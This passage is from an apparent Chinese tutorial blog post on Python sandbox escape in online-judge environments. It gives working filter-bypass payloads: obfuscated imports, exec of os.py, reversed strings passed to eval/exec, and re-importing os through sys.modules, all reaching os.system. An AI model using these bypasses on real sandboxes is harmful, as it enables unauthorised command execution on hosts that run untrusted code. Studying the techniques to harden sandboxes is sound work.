-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Python 的沙箱逃逸的最终目标就是执行系统任意命令，次一点的写文件，再次一点的读文件。</p>
-<p>顺便安利一本书：《流畅的 Python》。这本书有很多中高阶知识点，很全面而且讲的很清楚，如果你看过，相信理解这篇文章的大多数内容都不是问题。</p>
-<p>接下来的内容先讲系统命令执行，再讲文件写入、读取，并且均以 oj 为例，库大多以 <code>os</code> 为例。</p>
-<h2 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>先啰嗦一些基础知识</p>
-<p>在 Python 中执行系统命令的方式有：</p>
-<blockquote>
-<p>os</p>
-<p>commands：仅限<code>2.x</code></p>
-<p>subprocess</p>
-<p>timeit：<code>timeit.sys</code>、<code>timeit.timeit(&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;, number=1)</code></p>
-<p>platform：<code>platform.os</code>、<code>platform.sys</code>、<code>platform.popen(&#39;whoami&#39;, mode=&#39;r&#39;, bufsize=-1).read()</code></p>
-<p>pty：<code>pty.spawn(&#39;ls&#39;)</code>、<code>pty.os</code></p>
-<p>bdb：<code>bdb.os</code>、<code>cgi.sys</code></p>
-<p>cgi：<code>cgi.os</code>、<code>cgi.sys</code></p>
-<p>…</p>
-</blockquote>
-<p>我写了一个脚本，测试了一下所有的导入 <code>os</code> 或者 <code>sys</code> 的库：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf8 -*-</span><br><span class="line"># By Macr0phag3</span><br><span class="line"># in 2019-05-07 19:46:12</span><br><span class="line"># ------------------------------------</span><br><span class="line"></span><br><span class="line"># this, antigravity 库删掉</span><br><span class="line">all_modules_2 &#x3D; [</span><br><span class="line">    &#39;BaseHTTPServer&#39;, &#39;imaplib&#39;, &#39;shelve&#39;, &#39;Bastion&#39;, &#39;anydbm&#39;, &#39;imghdr&#39;, &#39;shlex&#39;, &#39;CDROM&#39;, &#39;argparse&#39;, &#39;imp&#39;, &#39;shutil&#39;, &#39;CGIHTTPServer&#39;, &#39;array&#39;, &#39;importlib&#39;, &#39;signal&#39;, &#39;Canvas&#39;, &#39;ast&#39;, &#39;imputil&#39;, &#39;site&#39;, &#39;ConfigParser&#39;, &#39;asynchat&#39;, &#39;inspect&#39;, &#39;sitecustomize&#39;, &#39;Cookie&#39;, &#39;asyncore&#39;, &#39;io&#39;, &#39;smtpd&#39;, &#39;DLFCN&#39;, &#39;atexit&#39;, &#39;itertools&#39;, &#39;smtplib&#39;, &#39;Dialog&#39;, &#39;audiodev&#39;, &#39;json&#39;, &#39;sndhdr&#39;, &#39;DocXMLRPCServer&#39;, &#39;audioop&#39;, &#39;keyword&#39;, &#39;socket&#39;, &#39;FileDialog&#39;, &#39;base64&#39;, &#39;lib2to3&#39;, &#39;spwd&#39;, &#39;FixTk&#39;, &#39;bdb&#39;, &#39;linecache&#39;, &#39;sqlite3&#39;, &#39;HTMLParser&#39;, &#39;binascii&#39;, &#39;linuxaudiodev&#39;, &#39;sre&#39;, &#39;IN&#39;, &#39;binhex&#39;, &#39;locale&#39;, &#39;sre_compile&#39;, &#39;MimeWriter&#39;, &#39;bisect&#39;, &#39;logging&#39;, &#39;sre_constants&#39;, &#39;Queue&#39;, &#39;bsddb&#39;, &#39;lsb_release&#39;, &#39;sre_parse&#39;, &#39;ScrolledText&#39;, &#39;bz2&#39;, &#39;macpath&#39;, &#39;ssl&#39;, &#39;SimpleDialog&#39;, &#39;cPickle&#39;, &#39;macurl2path&#39;, &#39;stat&#39;, &#39;SimpleHTTPServer&#39;, &#39;cProfile&#39;, &#39;mailbox&#39;, &#39;statvfs&#39;, &#39;SimpleXMLRPCServer&#39;, &#39;cStringIO&#39;, &#39;mailcap&#39;, &#39;string&#39;, &#39;SocketServer&#39;, &#39;calendar&#39;, &#39;markupbase&#39;, &#39;stringold&#39;, &#39;StringIO&#39;, &#39;cgi&#39;, &#39;marshal&#39;, &#39;stringprep&#39;, &#39;TYPES&#39;, &#39;cgitb&#39;, &#39;math&#39;, &#39;strop&#39;, &#39;Tix&#39;, &#39;chunk&#39;, &#39;md5&#39;, &#39;struct&#39;, &#39;Tkconstants&#39;, &#39;cmath&#39;, &#39;mhlib&#39;, &#39;subprocess&#39;, &#39;Tkdnd&#39;, &#39;cmd&#39;, &#39;mimetools&#39;, &#39;sunau&#39;, &#39;Tkinter&#39;, &#39;code&#39;, &#39;mimetypes&#39;, &#39;sunaudio&#39;, &#39;UserDict&#39;, &#39;codecs&#39;, &#39;mimify&#39;, &#39;symbol&#39;, &#39;UserList&#39;, &#39;codeop&#39;, &#39;mmap&#39;, &#39;symtable&#39;, &#39;UserString&#39;, &#39;collections&#39;, &#39;modulefinder&#39;, &#39;sys&#39;, &#39;_LWPCookieJar&#39;, &#39;colorsys&#39;, &#39;multifile&#39;, &#39;sysconfig&#39;, &#39;_MozillaCookieJar&#39;, &#39;commands&#39;, &#39;multiprocessing&#39;, &#39;syslog&#39;, &#39;__builtin__&#39;, &#39;compileall&#39;, &#39;mutex&#39;, &#39;tabnanny&#39;, &#39;__future__&#39;, &#39;compiler&#39;, &#39;netrc&#39;, &#39;talloc&#39;, &#39;_abcoll&#39;, &#39;contextlib&#39;, &#39;new&#39;, &#39;tarfile&#39;, &#39;_ast&#39;, &#39;cookielib&#39;, &#39;nis&#39;, &#39;telnetlib&#39;, &#39;_bisect&#39;, &#39;copy&#39;, &#39;nntplib&#39;, &#39;tempfile&#39;, &#39;_bsddb&#39;, &#39;copy_reg&#39;, &#39;ntpath&#39;, &#39;termios&#39;, &#39;_codecs&#39;, &#39;crypt&#39;, &#39;nturl2path&#39;, &#39;test&#39;, &#39;_codecs_cn&#39;, &#39;csv&#39;, &#39;numbers&#39;, &#39;textwrap&#39;, &#39;_codecs_hk&#39;, &#39;ctypes&#39;, &#39;opcode&#39;, &#39;_codecs_iso2022&#39;, &#39;curses&#39;, &#39;operator&#39;, &#39;thread&#39;, &#39;_codecs_jp&#39;, &#39;datetime&#39;, &#39;optparse&#39;, &#39;threading&#39;, &#39;_codecs_kr&#39;, &#39;dbhash&#39;, &#39;os&#39;, &#39;time&#39;, &#39;_codecs_tw&#39;, &#39;dbm&#39;, &#39;os2emxpath&#39;, &#39;timeit&#39;, &#39;_collections&#39;, &#39;decimal&#39;, &#39;ossaudiodev&#39;, &#39;tkColorChooser&#39;, &#39;_csv&#39;, &#39;difflib&#39;, &#39;parser&#39;, &#39;tkCommonDialog&#39;, &#39;_ctypes&#39;, &#39;dircache&#39;, &#39;pdb&#39;, &#39;tkFileDialog&#39;, &#39;_ctypes_test&#39;, &#39;dis&#39;, &#39;pickle&#39;, &#39;tkFont&#39;, &#39;_curses&#39;, &#39;distutils&#39;, &#39;pickletools&#39;, &#39;tkMessageBox&#39;, &#39;_curses_panel&#39;, &#39;doctest&#39;, &#39;pipes&#39;, &#39;tkSimpleDialog&#39;, &#39;_elementtree&#39;, &#39;dumbdbm&#39;, &#39;pkgutil&#39;, &#39;toaiff&#39;, &#39;_functools&#39;, &#39;dummy_thread&#39;, &#39;platform&#39;, &#39;token&#39;, &#39;_hashlib&#39;, &#39;dummy_threading&#39;, &#39;plistlib&#39;, &#39;tokenize&#39;, &#39;_heapq&#39;, &#39;email&#39;, &#39;popen2&#39;, &#39;trace&#39;, &#39;_hotshot&#39;, &#39;encodings&#39;, &#39;poplib&#39;, &#39;traceback&#39;, &#39;_io&#39;, &#39;ensurepip&#39;, &#39;posix&#39;, &#39;ttk&#39;, &#39;_json&#39;, &#39;errno&#39;, &#39;posixfile&#39;, &#39;tty&#39;, &#39;_locale&#39;, &#39;exceptions&#39;, &#39;posixpath&#39;, &#39;turtle&#39;, &#39;_lsprof&#39;, &#39;fcntl&#39;, &#39;pprint&#39;, &#39;types&#39;, &#39;_md5&#39;, &#39;filecmp&#39;, &#39;profile&#39;, &#39;unicodedata&#39;, &#39;_multibytecodec&#39;, &#39;fileinput&#39;, &#39;pstats&#39;, &#39;unittest&#39;, &#39;_multiprocessing&#39;, &#39;fnmatch&#39;, &#39;pty&#39;, &#39;urllib&#39;, &#39;_osx_support&#39;, &#39;formatter&#39;, &#39;pwd&#39;, &#39;urllib2&#39;, &#39;_pyio&#39;, &#39;fpformat&#39;, &#39;py_compile&#39;, &#39;urlparse&#39;, &#39;_random&#39;, &#39;fractions&#39;, &#39;pyclbr&#39;, &#39;user&#39;, &#39;_sha&#39;, &#39;ftplib&#39;, &#39;pydoc&#39;, &#39;uu&#39;, &#39;_sha256&#39;, &#39;functools&#39;, &#39;pydoc_data&#39;, &#39;uuid&#39;, &#39;_sha512&#39;, &#39;future_builtins&#39;, &#39;pyexpat&#39;, &#39;warnings&#39;, &#39;_socket&#39;, &#39;gc&#39;, &#39;quopri&#39;, &#39;wave&#39;, &#39;_sqlite3&#39;, &#39;genericpath&#39;, &#39;random&#39;, &#39;weakref&#39;, &#39;_sre&#39;, &#39;getopt&#39;, &#39;re&#39;, &#39;webbrowser&#39;, &#39;_ssl&#39;, &#39;getpass&#39;, &#39;readline&#39;, &#39;whichdb&#39;, &#39;_strptime&#39;, &#39;gettext&#39;, &#39;repr&#39;, &#39;wsgiref&#39;, &#39;_struct&#39;, &#39;glob&#39;, &#39;resource&#39;, &#39;xdrlib&#39;, &#39;_symtable&#39;, &#39;grp&#39;, &#39;rexec&#39;, &#39;xml&#39;, &#39;_sysconfigdata&#39;, &#39;gzip&#39;, &#39;rfc822&#39;, &#39;xmllib&#39;, &#39;_sysconfigdata_nd&#39;, &#39;hashlib&#39;, &#39;rlcompleter&#39;, &#39;xmlrpclib&#39;, &#39;_testcapi&#39;, &#39;heapq&#39;, &#39;robotparser&#39;, &#39;xxsubtype&#39;, &#39;_threading_local&#39;, &#39;hmac&#39;, &#39;runpy&#39;, &#39;zipfile&#39;, &#39;_warnings&#39;, &#39;hotshot&#39;, &#39;sched&#39;, &#39;zipimport&#39;, &#39;_weakref&#39;, &#39;htmlentitydefs&#39;, &#39;select&#39;, &#39;zlib&#39;, &#39;_weakrefset&#39;, &#39;htmllib&#39;, &#39;sets&#39;, &#39;abc&#39;, &#39;httplib&#39;, &#39;sgmllib&#39;, &#39;aifc&#39;, &#39;ihooks&#39;, &#39;sha&#39;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">all_modules_3 &#x3D; [</span><br><span class="line">    &#39;AptUrl&#39;, &#39;hmac&#39;, &#39;requests_unixsocket&#39;, &#39;CommandNotFound&#39;, &#39;apport&#39;, &#39;hpmudext&#39;, &#39;resource&#39;, &#39;Crypto&#39;, &#39;apport_python_hook&#39;, &#39;html&#39;, &#39;rlcompleter&#39;, &#39;DistUpgrade&#39;, &#39;apt&#39;, &#39;http&#39;, &#39;runpy&#39;, &#39;HweSupportStatus&#39;, &#39;apt_inst&#39;, &#39;httplib2&#39;, &#39;scanext&#39;, &#39;LanguageSelector&#39;, &#39;apt_pkg&#39;, &#39;idna&#39;, &#39;sched&#39;, &#39;NvidiaDetector&#39;, &#39;aptdaemon&#39;, &#39;imaplib&#39;, &#39;secrets&#39;, &#39;PIL&#39;, &#39;aptsources&#39;, &#39;imghdr&#39;, &#39;secretstorage&#39;, &#39;Quirks&#39;, &#39;argparse&#39;, &#39;imp&#39;, &#39;select&#39;, &#39;UbuntuDrivers&#39;, &#39;array&#39;, &#39;importlib&#39;, &#39;selectors&#39;, &#39;UbuntuSystemService&#39;, &#39;asn1crypto&#39;, &#39;inspect&#39;, &#39;shelve&#39;, &#39;UpdateManager&#39;, &#39;ast&#39;, &#39;io&#39;, &#39;shlex&#39;, &#39;__future__&#39;, &#39;asynchat&#39;, &#39;ipaddress&#39;, &#39;shutil&#39;, &#39;_ast&#39;, &#39;asyncio&#39;, &#39;itertools&#39;, &#39;signal&#39;, &#39;_asyncio&#39;, &#39;asyncore&#39;, &#39;janitor&#39;, &#39;simplejson&#39;, &#39;_bisect&#39;, &#39;atexit&#39;, &#39;json&#39;, &#39;site&#39;, &#39;_blake2&#39;, &#39;audioop&#39;, &#39;keyring&#39;, &#39;sitecustomize&#39;, &#39;_bootlocale&#39;, &#39;base64&#39;, &#39;keyword&#39;, &#39;six&#39;, &#39;_bz2&#39;, &#39;bdb&#39;, &#39;language_support_pkgs&#39;, &#39;smtpd&#39;, &#39;_cffi_backend&#39;, &#39;binascii&#39;, &#39;launchpadlib&#39;, &#39;smtplib&#39;, &#39;_codecs&#39;, &#39;binhex&#39;, &#39;linecache&#39;, &#39;sndhdr&#39;, &#39;_codecs_cn&#39;, &#39;bisect&#39;, &#39;locale&#39;, &#39;socket&#39;, &#39;_codecs_hk&#39;, &#39;brlapi&#39;, &#39;logging&#39;, &#39;socketserver&#39;, &#39;_codecs_iso2022&#39;, &#39;builtins&#39;, &#39;louis&#39;, &#39;softwareproperties&#39;, &#39;_codecs_jp&#39;, &#39;bz2&#39;, &#39;lsb_release&#39;, &#39;speechd&#39;, &#39;_codecs_kr&#39;, &#39;cProfile&#39;, &#39;lzma&#39;, &#39;speechd_config&#39;, &#39;_codecs_tw&#39;, &#39;cairo&#39;, &#39;macaroonbakery&#39;, &#39;spwd&#39;, &#39;_collections&#39;, &#39;calendar&#39;, &#39;macpath&#39;, &#39;sqlite3&#39;, &#39;_collections_abc&#39;, &#39;certifi&#39;, &#39;macurl2path&#39;, &#39;sre_compile&#39;, &#39;_compat_pickle&#39;, &#39;cgi&#39;, &#39;mailbox&#39;, &#39;sre_constants&#39;, &#39;_compression&#39;, &#39;cgitb&#39;, &#39;mailcap&#39;, &#39;sre_parse&#39;, &#39;_crypt&#39;, &#39;chardet&#39;, &#39;mako&#39;, &#39;ssl&#39;, &#39;_csv&#39;, &#39;chunk&#39;, &#39;markupsafe&#39;, &#39;stat&#39;, &#39;_ctypes&#39;, &#39;cmath&#39;, &#39;marshal&#39;, &#39;statistics&#39;, &#39;_ctypes_test&#39;, &#39;cmd&#39;, &#39;math&#39;, &#39;string&#39;, &#39;_curses&#39;, &#39;code&#39;, &#39;mimetypes&#39;, &#39;stringprep&#39;, &#39;_curses_panel&#39;, &#39;codecs&#39;, &#39;mmap&#39;, &#39;struct&#39;, &#39;_datetime&#39;, &#39;codeop&#39;, &#39;modual_test&#39;, &#39;subprocess&#39;, &#39;_dbm&#39;, &#39;collections&#39;, &#39;modulefinder&#39;, &#39;sunau&#39;, &#39;_dbus_bindings&#39;, &#39;colorsys&#39;, &#39;multiprocessing&#39;, &#39;symbol&#39;, &#39;_dbus_glib_bindings&#39;, &#39;compileall&#39;, &#39;nacl&#39;, &#39;symtable&#39;, &#39;_decimal&#39;, &#39;concurrent&#39;, &#39;netrc&#39;, &#39;sys&#39;, &#39;_dummy_thread&#39;, &#39;configparser&#39;, &#39;nis&#39;, &#39;sysconfig&#39;, &#39;_elementtree&#39;, &#39;contextlib&#39;, &#39;nntplib&#39;, &#39;syslog&#39;, &#39;_functools&#39;, &#39;copy&#39;, &#39;ntpath&#39;, &#39;systemd&#39;, &#39;_gdbm&#39;, &#39;copyreg&#39;, &#39;nturl2path&#39;, &#39;tabnanny&#39;, &#39;_hashlib&#39;, &#39;crypt&#39;, &#39;numbers&#39;, &#39;tarfile&#39;, &#39;_heapq&#39;, &#39;cryptography&#39;, &#39;oauth&#39;, &#39;telnetlib&#39;, &#39;_imp&#39;, &#39;csv&#39;, &#39;olefile&#39;, &#39;tempfile&#39;, &#39;_io&#39;, &#39;ctypes&#39;, &#39;opcode&#39;, &#39;termios&#39;, &#39;_json&#39;, &#39;cups&#39;, &#39;operator&#39;, &#39;test&#39;, &#39;_locale&#39;, &#39;cupsext&#39;, &#39;optparse&#39;, &#39;textwrap&#39;, &#39;_lsprof&#39;, &#39;cupshelpers&#39;, &#39;orca&#39;, &#39;_lzma&#39;, &#39;curses&#39;, &#39;os&#39;, &#39;threading&#39;, &#39;_markupbase&#39;, &#39;datetime&#39;, &#39;ossaudiodev&#39;, &#39;time&#39;, &#39;_md5&#39;, &#39;dbm&#39;, &#39;parser&#39;, &#39;timeit&#39;, &#39;_multibytecodec&#39;, &#39;dbus&#39;, &#39;pathlib&#39;, &#39;token&#39;, &#39;_multiprocessing&#39;, &#39;deb822&#39;, &#39;pcardext&#39;, &#39;tokenize&#39;, &#39;_opcode&#39;, &#39;debconf&#39;, &#39;pdb&#39;, &#39;trace&#39;, &#39;_operator&#39;, &#39;debian&#39;, &#39;pexpect&#39;, &#39;traceback&#39;, &#39;_osx_support&#39;, &#39;debian_bundle&#39;, &#39;pickle&#39;, &#39;tracemalloc&#39;, &#39;_pickle&#39;, &#39;decimal&#39;, &#39;pickletools&#39;, &#39;tty&#39;, &#39;_posixsubprocess&#39;, &#39;defer&#39;, &#39;pipes&#39;, &#39;turtle&#39;, &#39;_pydecimal&#39;, &#39;difflib&#39;, &#39;pkg_resources&#39;, &#39;types&#39;, &#39;_pyio&#39;, &#39;dis&#39;, &#39;pkgutil&#39;, &#39;typing&#39;, &#39;_random&#39;, &#39;distro_info&#39;, &#39;platform&#39;, &#39;ufw&#39;, &#39;_sha1&#39;, &#39;distro_info_test&#39;, &#39;plistlib&#39;, &#39;unicodedata&#39;, &#39;_sha256&#39;, &#39;distutils&#39;, &#39;poplib&#39;, &#39;unittest&#39;, &#39;_sha3&#39;, &#39;doctest&#39;, &#39;posix&#39;, &#39;urllib&#39;, &#39;_sha512&#39;, &#39;dummy_threading&#39;, &#39;posixpath&#39;, &#39;urllib3&#39;, &#39;_signal&#39;, &#39;email&#39;, &#39;pprint&#39;, &#39;usbcreator&#39;, &#39;_sitebuiltins&#39;, &#39;encodings&#39;, &#39;problem_report&#39;, &#39;uu&#39;, &#39;_socket&#39;, &#39;enum&#39;, &#39;profile&#39;, &#39;uuid&#39;, &#39;_sqlite3&#39;, &#39;errno&#39;, &#39;pstats&#39;, &#39;venv&#39;, &#39;_sre&#39;, &#39;faulthandler&#39;, &#39;pty&#39;, &#39;wadllib&#39;, &#39;_ssl&#39;, &#39;fcntl&#39;, &#39;ptyprocess&#39;, &#39;warnings&#39;, &#39;_stat&#39;, &#39;filecmp&#39;, &#39;pwd&#39;, &#39;wave&#39;, &#39;_string&#39;, &#39;fileinput&#39;, &#39;py_compile&#39;, &#39;weakref&#39;, &#39;_strptime&#39;, &#39;fnmatch&#39;, &#39;pyatspi&#39;, &#39;webbrowser&#39;, &#39;_struct&#39;, &#39;formatter&#39;, &#39;pyclbr&#39;, &#39;wsgiref&#39;, &#39;_symtable&#39;, &#39;fractions&#39;, &#39;pydoc&#39;, &#39;xdg&#39;, &#39;_sysconfigdata_m_linux_x86_64-linux-gnu&#39;, &#39;ftplib&#39;, &#39;pydoc_data&#39;, &#39;xdrlib&#39;, &#39;_testbuffer&#39;, &#39;functools&#39;, &#39;pyexpat&#39;, &#39;xkit&#39;, &#39;_testcapi&#39;, &#39;gc&#39;, &#39;pygtkcompat&#39;, &#39;xml&#39;, &#39;_testimportmultiple&#39;, &#39;genericpath&#39;, &#39;pymacaroons&#39;, &#39;xmlrpc&#39;, &#39;_testmultiphase&#39;, &#39;getopt&#39;, &#39;pyrfc3339&#39;, &#39;xxlimited&#39;, &#39;_thread&#39;, &#39;getpass&#39;, &#39;pytz&#39;, &#39;xxsubtype&#39;, &#39;_threading_local&#39;, &#39;gettext&#39;, &#39;queue&#39;, &#39;yaml&#39;, &#39;_tracemalloc&#39;, &#39;gi&#39;, &#39;quopri&#39;, &#39;zipapp&#39;, &#39;_warnings&#39;, &#39;glob&#39;, &#39;random&#39;, &#39;zipfile&#39;, &#39;_weakref&#39;, &#39;grp&#39;, &#39;re&#39;, &#39;zipimport&#39;, &#39;_weakrefset&#39;, &#39;gtweak&#39;, &#39;readline&#39;, &#39;zlib&#39;, &#39;_yaml&#39;, &#39;gzip&#39;, &#39;reportlab&#39;, &#39;zope&#39;, &#39;abc&#39;, &#39;hashlib&#39;, &#39;reprlib&#39;, &#39;aifc&#39;, &#39;heapq&#39;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">methods &#x3D; [&#39;os&#39;, &#39;sys&#39;, &#39;__builtins__&#39;]</span><br><span class="line"></span><br><span class="line">results &#x3D; &#123;&#125;</span><br><span class="line">for module in all_modules_3:</span><br><span class="line">    results[module] &#x3D; &#123;</span><br><span class="line">        &#39;flag&#39;: 0,</span><br><span class="line">        &#39;result&#39;: &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        m &#x3D; __import__(module)</span><br><span class="line">        attrs &#x3D; dir(m)</span><br><span class="line">        for method in methods:</span><br><span class="line">            if method in attrs:</span><br><span class="line">                result &#x3D; &#39;yes&#39;</span><br><span class="line">                results[module][&#39;flag&#39;] &#x3D; 1</span><br><span class="line">            else:</span><br><span class="line">                result &#x3D; &#39;no&#39;</span><br><span class="line"></span><br><span class="line">            results[module][&#39;result&#39;][method] &#x3D; result</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line"></span><br><span class="line">for result in results:</span><br><span class="line">    if results[result][&#39;flag&#39;]:</span><br><span class="line">        print(&#39;[+]&#39; + result)</span><br><span class="line">        for r in results[result][&#39;result&#39;]:</span><br><span class="line">            print(&#39;  [-]&#39; + r + &#39;: &#39; + results[result][&#39;result&#39;][r])</span><br></pre></td></tr></table></figure>
-
-<p><code>all_modules_2</code>就是 2.x 的标准库，<code>all_modules_3</code> 就是 3.x 的标准库。</p>
-<p>结果相当多，这里就不贴了。这里注意一下，这个文件别命名为 <code>test.py</code>，如果命名为 test 会怎么样呢？可以先猜一猜，后面会给解释。</p>
-<p>如果 oj 支持 <code>import</code> 的话，这些库都是高危的，放任不管基本上是坐等被日。所以为了避免过滤不完善导致各种问题，在 Python 沙箱套一层 docker 肯定不会是坏事。</p>
-<h3 id="花式-import"><a href="#花式-import" class="headerlink" title="花式 import"></a>花式 import</h3><p>首先，禁用 <code>import os</code> 肯定是不行的，因为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import  os</span><br><span class="line">import   os</span><br><span class="line">import    os</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
-<p>都可以。如果多个空格也过滤了，Python 能够 import 的可不止 <code>import</code>，还有 <code>__import__</code>：<code>__import__(&#39;os&#39;)</code>，<code>__import__</code>被干了还有 <code>importlib</code>：<code>importlib.import_module(&#39;os&#39;).system(&#39;ls&#39;)</code></p>
-<p>这样就安全了吗？实际上<code>import</code>可以通过其他方式完成。回想一下 import 的原理，本质上就是执行一遍导入的库。这个过程实际上可以用 <code>execfile</code> 来代替：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">execfile(&#39;&#x2F;usr&#x2F;lib&#x2F;python2.7&#x2F;os.py&#39;)</span><br><span class="line">system(&#39;ls&#39;)</span><br></pre></td></tr></table></figure>
-
-<p>不过要注意，2.x 才能用，3.x 删了 execfile，不过可以这样：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">with open(&#39;&#x2F;usr&#x2F;lib&#x2F;python3.6&#x2F;os.py&#39;,&#39;r&#39;) as f:</span><br><span class="line">    exec(f.read())</span><br><span class="line">system(&#39;ls&#39;)</span><br></pre></td></tr></table></figure>
-
-<p>这个方法倒是 2.x、3.x 通用的。</p>
-<p>不过要使用上面的这两种方法，就必须知道库的路径。其实在大多数的环境下，库都是默认路径。如果 sys 没被干掉的话，还可以确认一下，：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">print(sys.path)</span><br></pre></td></tr></table></figure>
-
-<h3 id="花式处理字符串"><a href="#花式处理字符串" class="headerlink" title="花式处理字符串"></a>花式处理字符串</h3><p>代码中要是出现 <code>os</code>，直接不让运行。那么可以利用字符串的各种变化来引入 os：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__import__(&#39;so&#39;[::-1]).system(&#39;ls&#39;)</span><br><span class="line">b &#x3D; &#39;o&#39;</span><br><span class="line">a &#x3D; &#39;s&#39;</span><br><span class="line">__import__(a+b).system(&#39;ls&#39;)</span><br></pre></td></tr></table></figure>
-
-<p>还可以利用 <code>eval</code> 或者 <code>exec</code>：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; eval(&#39;)&quot;imaohw&quot;(metsys.)&quot;so&quot;(__tropmi__&#39;[::-1])</span><br><span class="line">macr0phag3</span><br><span class="line">0</span><br><span class="line">&gt;&gt;&gt; exec(&#39;)&quot;imaohw&quot;(metsys.so ;so tropmi&#39;[::-1])</span><br><span class="line">macr0phag3</span><br></pre></td></tr></table></figure>
-
-<p>顺便说一下，eval、exec 都是相当危险的函数，exec 比 eval 还要危险，它们一定要过滤，因为字符串有很多变形的方式，对字符串的处理可以有：逆序、变量拼接、base64、hex、rot13…等等，太多了。。。</p>
-<h3 id="恢复-sys-modules"><a href="#恢复-sys-modules" class="headerlink" title="恢复 sys.modules"></a>恢复 sys.modules</h3><p><code>sys.modules</code> 是一个字典，里面储存了加载过的模块信息。如果 Python 是刚启动的话，所列出的模块就是解释器在启动时自动加载的模块。有些库例如 <code>os</code> 是默认被加载进来的，但是不能直接使用，原因在于 sys.modules 中未经 import 加载的模块对当前空间是不可见的。</p>
-<p>如果将 os 从 sys.modules 中剔除，os 就彻底没法用了：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; sys.modules[&#39;os&#39;] &#x3D; &#39;not allowed&#39;</span><br><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">&gt;&gt;&gt; os.system(&#39;ls&#39;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">AttributeError: &#39;str&#39; object has no attribute &#39;system&#39;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>注意，这里不能用 <code>del sys.modules[&#39;os&#39;]</code>，因为，当 import 一个模块时：import A，检查 sys.modules 中是否已经有 A，如果有则不加载，如果没有则为 A 创建 module 对象，并加载 A。</p>
-<p>所以删了 <code>sys.modules[&#39;os&#39;]</code> 只会让 Python 重新加载一次 os。</p>
-<p>看到这你肯定发现了，对于上面的过滤方式，绕过的方式可以是这样：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sys.modules[&#39;os&#39;] &#x3D; &#39;not allowed&#39; # oj 为你加的</span><br><span class="line"></span><br><span class="line">del sys.modules[&#39;os&#39;]</span><br><span class="line">import os</span><br><span class="line">os.system(&#39;ls&#39;)</span><br></pre></td></tr></table></figure>
-
-<p>最后还有一种利用 <code>__builtins__</code> 导入的方式，下面会详细说。</p>
-<h3 id="花式执行函数"><a href="#花式执行函数" class="headerlink" title="花式执行函数"></a>花式执行函数</h3><p>通过上面内容我们很容易发现，光引入 os 只不过是第一步，如果把 system 这个函数干掉，也没法通过<code>os.system</code>执行系统命令，并且这里的<code>system</code>也不是字符串，也没法直接做编码等等操作。我遇到过一个环境，直接在<code>/usr/lib/python2.7/os.py</code>中删了<code>system</code>函数。。。</p>
-<p>不过，要明确的是，os 中能够执行系统命令的函数有很多：</p>
